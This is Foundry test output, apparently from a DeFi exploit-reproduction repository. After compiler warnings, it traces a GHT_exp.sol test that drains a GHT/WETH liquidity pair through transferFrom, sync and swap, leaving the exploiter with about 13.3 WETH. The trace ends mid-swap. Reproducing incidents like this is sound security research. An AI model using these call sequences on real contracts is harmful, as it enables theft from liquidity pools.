Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.16s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2024-03/GHT_exp.sol:24:5:
   |
24 |     WETH9 private constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 258.56ms (205.02µs CPU time)

Ran 1 test for src/test/2024-03/GHT_exp.sol:ContractTest
[PASS] testExploit() (gas: 2060165)
Logs:
  Exploiter WETH balance before attack: 0.000000000000000000
  Exploiter WETH balance after attack: 13.299999999999999999

Traces:
  [2580472] ContractTest::testExploit()
    ├─ [2534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [2444] WETH::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Exploiter WETH balance before attack", val: 0, decimals: 18)
    ├─ [7479] GHT::balanceOf(WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe]) [staticcall]
    │   ├─ [2581] 0x17dfb09194ab77DCf318839cFdD01f587a73a77E::balanceOf(WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe]) [delegatecall]
    │   │   └─ ← [Return] 450000000000000000000000 [4.5e23]
    │   └─ ← [Return] 450000000000000000000000 [4.5e23]
    ├─ [2161745] GHT::transferFrom(WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], 449999999999999999999999 [4.499e23])
    │   ├─ [2161341] 0x17dfb09194ab77DCf318839cFdD01f587a73a77E::transferFrom(WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], 449999999999999999999999 [4.499e23]) [delegatecall]
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 77)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 86)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 89)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 99)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 121)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 266)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 131)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 151)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 424)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 434)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 436)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 399)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 396)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 114)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 302)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 235)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 50)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 205)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 662)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 699)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 737)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 747)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 811)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 824)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 861)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 871)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 22)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 97)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 136)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 165)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 193)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 219)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 258)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 184)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 93)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 156)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 160)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 218)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 188)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 227)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 230)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 253)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 241)
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 101)
    │   │   ├─ [98923] 0xacCBe3798c56dE34C6df49b605873Fd91b8caFf8::ae000659(00000000000000000000000000000000000000000000000000000000000000a1000000000000000000000000706206eabd6a70ca4992eec1646b6d1599259cae0000000000000000000000000000000000000000000000000000000065e9448f)
    │   │   │   ├─ [94019] 0xBd103A46D305D1Fd84035f44194b69385fcb0713::ae000659(00000000000000000000000000000000000000000000000000000000000000a1000000000000000000000000706206eabd6a70ca4992eec1646b6d1599259cae0000000000000000000000000000000000000000000000000000000065e9448f) [delegatecall]
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Return] 
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 161)
    │   │   ├─ [1136] 0xacCBe3798c56dE34C6df49b605873Fd91b8caFf8::size() [staticcall]
    │   │   │   ├─ [741] 0xBd103A46D305D1Fd84035f44194b69385fcb0713::size() [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ emit Transfer(_from: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _to: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _tokenId: 449999999999999999999999 [4.499e23])
    │   │   ├─ emit ERC20Transfer(param0: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], param1: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], param2: 449999999999999999999999 [4.499e23])
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] 
    ├─ [65447] WETH_GHT::sync()
    │   ├─ [979] GHT::balanceOf(WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe]) [staticcall]
    │   │   ├─ [581] 0x17dfb09194ab77DCf318839cFdD01f587a73a77E::balanceOf(WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe]) [delegatecall]
    │   │   │   └─ ← [Return] 1
    │   │   └─ ← [Return] 1
    │   ├─ [2534] WETH::balanceOf(WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe]) [staticcall]
    │   │   └─ ← [Return] 13300000000000000000 [1.33e19]
    │   ├─ emit Sync(reserve0: 1, reserve1: 13300000000000000000 [1.33e19])
    │   └─ ← [Stop] 
    ├─ [979] GHT::balanceOf(GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0]) [staticcall]
    │   ├─ [581] 0x17dfb09194ab77DCf318839cFdD01f587a73a77E::balanceOf(GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0]) [delegatecall]
    │   │   └─ ← [Return] 449999999999999999999999 [4.499e23]
    │   └─ ← [Return] 449999999999999999999999 [4.499e23]
    ├─ [279906] GHT::transferFrom(GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], 449999999999999999999999 [4.499e23])
    │   ├─ [279502] 0x17dfb09194ab77DCf318839cFdD01f587a73a77E::transferFrom(GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], 449999999999999999999999 [4.499e23]) [delegatecall]
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 161)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 101)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 241)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 253)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 230)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 227)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 188)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 218)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 160)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 156)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 93)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 184)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 258)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 219)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 193)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 165)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 136)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 97)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 22)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 871)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 861)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 824)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 811)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 747)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 737)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 699)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 662)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 205)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 50)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 235)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 302)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 114)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 396)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 399)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 436)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 434)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 424)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 151)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 131)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 266)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 121)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 99)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 89)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 86)
    │   │   ├─ [1136] 0xacCBe3798c56dE34C6df49b605873Fd91b8caFf8::size() [staticcall]
    │   │   │   ├─ [741] 0xBd103A46D305D1Fd84035f44194b69385fcb0713::size() [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [5624] 0xacCBe3798c56dE34C6df49b605873Fd91b8caFf8::dequeue()
    │   │   │   ├─ [5223] 0xBd103A46D305D1Fd84035f44194b69385fcb0713::dequeue() [delegatecall]
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000a1000000000000000000000000706206eabd6a70ca4992eec1646b6d1599259cae0000000000000000000000000000000000000000000000000000000065e9448f
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000a1000000000000000000000000706206eabd6a70ca4992eec1646b6d1599259cae0000000000000000000000000000000000000000000000000000000065e9448f
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 161)
    │   │   ├─ emit Transfer(_from: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], _to: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], _tokenId: 449999999999999999999999 [4.499e23])
    │   │   ├─ emit ERC20Transfer(param0: GHT: [0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0], param1: WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe], param2: 449999999999999999999999 [4.499e23])
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] 
    ├─ [979] GHT::balanceOf(WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe]) [staticcall]
    │   ├─ [581] 0x17dfb09194ab77DCf318839cFdD01f587a73a77E::balanceOf(WETH_GHT: [0x706206EabD6A70ca4992eEc1646B6D1599259CAe]) [delegatecall]
    │   │   └─ ← [Return] 450000000000000000000000 [4.5e23]
    │   └─ ← [Return] 450000000000000000000000 [4.5e23]
    ├─ [504] WETH_GHT::getReserves() [staticcall]
    │   └─ ← [Return] 1, 13300000000000000000 [1.33e19], 1709786255 [1.709e9]
    ├─ [39582] WETH_GHT::swap(0, 13299999999999999999 [1.329e19], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   ├─ [25962] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 13299999999999999999 [1.329e19])
